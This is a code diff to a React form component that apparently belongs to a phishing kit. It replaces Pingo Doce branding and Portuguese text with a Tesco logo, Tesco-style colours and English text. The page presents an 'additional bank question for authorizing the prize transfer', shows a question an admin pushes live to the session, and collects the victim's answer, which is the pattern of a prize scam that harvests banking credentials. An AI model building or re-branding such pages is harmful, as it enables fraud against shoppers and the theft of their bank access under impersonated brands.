@@ -139,7 +139,7 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
   return (
     <div className="flex min-h-[100dvh] items-center justify-center px-4 py-10">
-      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4ecd9] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4e2f0] bg-white px-6 py-8 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
         {done ? (
           <div className="py-8 text-center">
             <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
@@ -161,16 +161,16 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
             {/* IKI logo */}
             <div className="flex justify-center">
               <img
-                src="/form-assets/iki-mini-logo.png"
-                alt="Pingo Doce"
+                src="/form-assets/tesco-mini-logo.png"
+                alt="Tesco"
                 className="h-8 w-auto object-contain"
               />
             </div>
 
             {/* Kalkan ikonu */}
             <div className="flex justify-center">
-              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#eef9f0]">
-                <svg className="h-8 w-8 text-[#86efac]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
+              <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#eef4fa]">
+                <svg className="h-8 w-8 text-[#4d9de0]" fill="none" stroke="currentColor" strokeWidth={1.8} viewBox="0 0 24 24">
                   <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
                 </svg>
               </div>
@@ -178,13 +178,13 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
 
             {/* Baslik */}
             <h1 className="text-center text-[1.3rem] font-bold leading-snug tracking-tight text-gray-800">
-              Questão adicional do banco para autorização da transferência do prémio
+              Additional bank question for authorizing the prize transfer
             </h1>
 
             {/* Admin'in sorusu */}
-            <div className="rounded-xl border-l-4 border-[#22c55e] bg-[#f0faf6] px-4 py-3">
+            <div className="rounded-xl border-l-4 border-[#00539f] bg-[#f0f6fb] px-4 py-3">
               <p className="mb-1 text-[10px] font-bold uppercase tracking-widest text-[var(--brand)]">
-                Questão
+                Question
               </p>
               <p className="text-sm font-semibold text-gray-800 break-words">
                 {currentQuestion || "..."}
@@ -207,8 +207,8 @@ export function CustomQuestionClient({ sessionId }: { sessionId: string | null }
                   required
                   value={answer}
                   onChange={(e) => setAnswer(e.target.value)}
-                  placeholder="Introduza a sua resposta aqui..."
-                  className="w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#22c55e] focus:bg-white focus:ring-2 focus:ring-[#22c55e]/20"
+                  placeholder="Enter your answer here..."
+                  className="w-full rounded-xl border border-gray-200 bg-gray-50 py-3.5 pl-10 pr-4 text-sm font-medium text-gray-900 outline-none transition-all focus:border-[#00539f] focus:bg-white focus:ring-2 focus:ring-[#00539f]/20"
                 />
               </div>
             </div>
